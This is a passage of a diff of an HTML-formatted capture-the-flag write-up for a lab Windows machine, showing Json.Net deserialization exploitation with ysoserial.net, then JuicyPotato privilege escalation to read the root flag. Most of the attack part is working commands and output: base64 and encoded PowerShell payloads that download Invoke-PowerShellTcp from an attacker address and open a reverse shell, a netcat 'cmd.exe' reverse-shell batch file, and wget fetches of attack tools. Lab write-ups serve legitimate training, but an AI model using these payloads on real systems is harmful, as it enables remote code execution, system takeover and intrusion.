-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Bearer: bd049f221af82804c5a2826809337c9b
+</span></span></code></pre></div><p>Changing the Bearer with base64; Server will ask for json format</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Bearer: bd049f221af82804c5a2826809337c9b
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">{</span><span style="color:#f1fa8c">&#34;Message&#34;</span>:<span style="color:#f1fa8c">&#34;An error has occurred.&#34;</span>,<span style="color:#f1fa8c">&#34;ExceptionMessage&#34;</span>:<span style="color:#f1fa8c">&#34;Cannot deserialize Json.Net Object&#34;</span>,<span style="color:#f1fa8c">&#34;ExceptionType&#34;</span>:<span style="color:#f1fa8c">&#34;System.Exception&#34;</span>,<span style="color:#f1fa8c">&#34;StackTrace&#34;</span>:null<span style="color:#ff79c6">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>Site running ASP, we may be able to exploit Json.Net Deserialization Object.
+</span></span></code></pre></div><p>Site running ASP, we may be able to exploit Json.Net Deserialization Object.
 We come up with this resource <a href="https://github.com/pwntester/ysoserial.net.git">Deserialization payload generator for a variety of .NET formatters </a></p>
 <h1 id="weaponization">Weaponization</h1>
 <p>We create a payload that ping our machine and we start <code>tcpdump -i utun4 icmp</code></p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>COMMANDO VM
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>COMMANDO VM
 </span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\.</span>..<span style="color:#f1fa8c">\y</span>soserial<span style="color:#f1fa8c">\b</span>in<span style="color:#f1fa8c">\R</span>elease &gt; .<span style="color:#f1fa8c">\y</span>soserial.exe -g ObjectDataProvider -f Json.Net -c <span style="color:#f1fa8c">&#34;ping -n 1 10.10.14.79&#34;</span> -o base64
 </span></span><span style="display:flex;"><span>ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1JywgDQogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsDQogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsNCiAgICAgICAgJyR0eXBlJzonU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywgJy9jIHBpbmcgLW4gMSAxMC4xMC4xNC43OSddDQogICAgfSwNCiAgICAnT2JqZWN0SW5zdGFuY2UnOnsnJHR5cGUnOidTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OSd9DQp9
 </span></span><span style="display:flex;"><span>
@@ -491,23 +311,8 @@ We come up with this resource <a href="https://github.com/pwntester/ysoserial.ne
 </span></span><span style="display:flex;"><span>12:25:52.573860 IP 10.10.14.79 &gt; 10.10.10.158: ICMP <span style="color:#8be9fd;font-style:italic">echo</span> reply, id 1, seq 27, length <span style="color:#bd93f9">40</span>
 </span></span><span style="display:flex;"><span>^C
 </span></span><span style="display:flex;"><span><span style="color:#bd93f9">2</span> packets captured
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>Alternatively, if you don&rsquo;t have visual studio or microsoft windows host to compile; instead of spinning-up a windows VM, we can copy the example on the git hub README.md and replace <code>/ccalc</code> with a powershell script loading a <a href="https://github.com/samratashok/nishang.git">Nishang Powershell Script</a></p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ff79c6">{</span>
+</span></span></code></pre></div><p>Alternatively, if you don&rsquo;t have visual studio or microsoft windows host to compile; instead of spinning-up a windows VM, we can copy the example on the git hub README.md and replace <code>/ccalc</code> with a powershell script loading a <a href="https://github.com/samratashok/nishang.git">Nishang Powershell Script</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ff79c6">{</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;</span><span style="color:#8be9fd;font-style:italic">$type</span><span style="color:#f1fa8c">&#34;</span>:<span style="color:#f1fa8c">&#34;System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&#34;</span>,
 </span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;MethodName&#34;</span>:<span style="color:#f1fa8c">&#34;Start&#34;</span>,
 </span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;MethodParameters&#34;</span>:<span style="color:#ff79c6">{</span>
@@ -516,40 +321,11 @@ We come up with this resource <a href="https://github.com/pwntester/ysoserial.ne
 </span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>,
 </span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;ObjectInstance&#34;</span>:<span style="color:#ff79c6">{</span><span style="color:#f1fa8c">&#34;</span><span style="color:#8be9fd;font-style:italic">$type</span><span style="color:#f1fa8c">&#34;</span>:<span style="color:#f1fa8c">&#34;System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&#34;</span><span style="color:#ff79c6">}</span>
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>We have now a base64 payload for the Bearer:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ctf@6274ae97a895:~/json/ysoserial.net$ cat payload.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | base64 -w <span style="color:#bd93f9">0</span> ; <span style="color:#8be9fd;font-style:italic">echo</span> -n
+</span></span></code></pre></div><p>We have now a base64 payload for the Bearer:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ctf@6274ae97a895:~/json/ysoserial.net$ cat payload.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | base64 -w <span style="color:#bd93f9">0</span> ; <span style="color:#8be9fd;font-style:italic">echo</span> -n
 </span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">eyIkdHlwZSI6IlN5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1IiwiTWV0aG9kTmFtZSI6IlN0YXJ0IiwiTWV0aG9kUGFyYW1ldGVycyI6eyIkdHlwZSI6IlN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3QsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OSIsIiR2YWx1ZXMiOlsiY21kIiwiL2Nwb3dlcnNoZWxsICAtdyBoaWRkZW4gLW5vbmkgLW5vcCAtYyBcIklFWChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLmRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTAuMTAuMTUuMTc2OjgwODAvSW52b2tlLVBvd2VyU2hlbGxUY3AucHMxJyk7SW52b2tlLVBvd2VyU2hlbGxUY3AgLVJldmVyc2UgLUlQQWRkcmVzcyAxMC4xMC4xNS4xNzYgLVBvcnQgODAwMFwiIl19LCJPYmplY3RJbnN0YW5jZSI6eyIkdHlwZSI6IlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5In19Cg</span><span style="color:#ff79c6">==</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>We forward ports before we send the payload with Burp:<code>ssh username@localhost -L 10.10.15.176:8080:192.168.99.100:8080 -L 10.10.15.176:8000:192.168.99.100:8000</code></p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\w</span>indows<span style="color:#f1fa8c">\s</span>ystem32<span style="color:#f1fa8c">\i</span>netsrv&gt; whoami
+</span></span></code></pre></div><p>We forward ports before we send the payload with Burp:<code>ssh username@localhost -L 10.10.15.176:8080:192.168.99.100:8080 -L 10.10.15.176:8000:192.168.99.100:8000</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\w</span>indows<span style="color:#f1fa8c">\s</span>ystem32<span style="color:#f1fa8c">\i</span>netsrv&gt; whoami
 </span></span><span style="display:flex;"><span>json<span style="color:#f1fa8c">\u</span>serpool
 </span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\w</span>indows<span style="color:#f1fa8c">\s</span>ystem32<span style="color:#f1fa8c">\i</span>netsrv&gt; whoami /priv
 </span></span><span style="display:flex;"><span>
@@ -564,74 +340,25 @@ We come up with this resource <a href="https://github.com/pwntester/ysoserial.ne
 </span></span><span style="display:flex;"><span>SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
 </span></span><span style="display:flex;"><span>SeImpersonatePrivilege        Impersonate a client after authentication Enabled
 </span></span><span style="display:flex;"><span>SeIncreaseWorkingSetPrivilege Increase a process working <span style="color:#8be9fd;font-style:italic">set</span>            Disabled
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>We get the user flag</p>
+</span></span></code></pre></div><p>We get the user flag</p>
 <h1 id="beyond-root">Beyond root</h1>
 <h2 id="juicypotato-root-privilege-escalation">JuicyPotato Root Privilege Escalation</h2>
 <p>Having SeImpersonatePrivilege and SeAssignPrimaryToken together enable <a href="https://github.com/ohpe/juicy-potato.git">Juicy-Potato</a> attack for root privilege escalation.
 we can compile it from source but it requires a windows VM, so it is easier to download the <a href="https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe">release</a></p>
 <p>we need to find the CSLIDs of the machine, using this script: <a href="https://raw.githubusercontent.com/ohpe/juicy-potato/master/CLSID/GetCLSID.ps1">GetCLSID.ps1</a>
 There is a better script <a href="https://raw.githubusercontent.com/ohpe/juicy-potato/master/Test/test_clsid.bat">test_clsid.bat</a> which will try all CLSID from, this list <a href="https://raw.githubusercontent.com/ohpe/juicy-potato/master/CLSID/Windows_Server_2012_Datacenter/CLSID.list">CLSID.list</a></p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ff79c6">{</span>e60687f7-01a1-40aa-86ac-db1cbf673334<span style="color:#ff79c6">}</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ff79c6">{</span>e60687f7-01a1-40aa-86ac-db1cbf673334<span style="color:#ff79c6">}</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\u</span>serpool<span style="color:#f1fa8c">\M</span>usic&gt; <span style="color:#8be9fd;font-style:italic">$env</span>:PROCESSOR_ARCHITECTURE
 </span></span><span style="display:flex;"><span>AMD64
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>Juicy-Potato is required to be launched from cmd.exe as it is not powershell-friendly,so the below cannot work :(</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#6272a4"># WRONG : we have to use a *.bat file</span>
+</span></span></code></pre></div><p>Juicy-Potato is required to be launched from cmd.exe as it is not powershell-friendly,so the below cannot work :(</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#6272a4"># WRONG : we have to use a *.bat file</span>
 </span></span><span style="display:flex;"><span>cmd /c juicypotato.exe -t * -p <span style="color:#f1fa8c">&#34;c:/windows/system32/cmd.exe /C powershell.exe -w hidden -noni -nop -encodedcommand IgBJAEUAWAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA1AC4AMQA3ADYAOgA4ADAAOAAwAC8ASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwAC4AcABzADEAJwApADsASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwACAALQBSAGUAdgBlAHIAcwBlACAALQBJAFAAQQBkAGQAcgBlAHMAcwAgADEAMAAuADEAMAAuADEANQAuADEANwA2ACAALQBQAG8AcgB0ACAAOAAwADAAMAAiAAoA&#34;</span> -l <span style="color:#bd93f9">1000</span> -c <span style="color:#f1fa8c">&#34;{e60687f7-01a1-40aa-86ac-db1cbf673334}&#34;</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>So we download a <a href="https://github.com/int0x33/nc.exe">netcat binary</a> and we prepare a *.bat reverse shell</p>
+</span></span></code></pre></div><p>So we download a <a href="https://github.com/int0x33/nc.exe">netcat binary</a> and we prepare a *.bat reverse shell</p>
 <pre tabindex="0"><code>#reverse.bat
 \users\userpool\music\nc64.exe -e cmd.exe 10.10.14.70 8000
 </code></pre><p>We launch our exploit</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\u</span>serpool<span style="color:#f1fa8c">\m</span>usic&gt; wget -outfile reverse.bat http://10.10.14.70:8080/reverse.bat
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\u</span>serpool<span style="color:#f1fa8c">\m</span>usic&gt; wget -outfile reverse.bat http://10.10.14.70:8080/reverse.bat
 </span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\u</span>serpool<span style="color:#f1fa8c">\m</span>usic&gt; wget -outfile juicypotato.exe http://10.10.14.70:8080/JuicyPotato.exe
 </span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\u</span>serpool<span style="color:#f1fa8c">\m</span>usic&gt; wget -outfile nc64.exe http://10.10.14.70:8080/nc64.exe
 </span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\u</span>serpool<span style="color:#f1fa8c">\m</span>usic&gt; cmd /c juicypotato.exe -t * -p <span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\u</span>serpool<span style="color:#f1fa8c">\m</span>usic<span style="color:#f1fa8c">\r</span>everse.bat -l <span style="color:#bd93f9">1000</span> -c <span style="color:#f1fa8c">&#34;{E60687f7-01a1-40aa-86ac-db1cbf673334}&#34;</span>
@@ -656,76 +383,25 @@ There is a better script <a href="https://raw.githubusercontent.com/ohpe/juicy-p
 </span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">type</span> root.txt
 </span></span><span style="display:flex;"><span>3cc*************************d441
 </span></span><span style="display:flex;"><span>C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\s</span>uperadmin<span style="color:#f1fa8c">\D</span>esktop&gt;
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>We now have the flag :)</p>
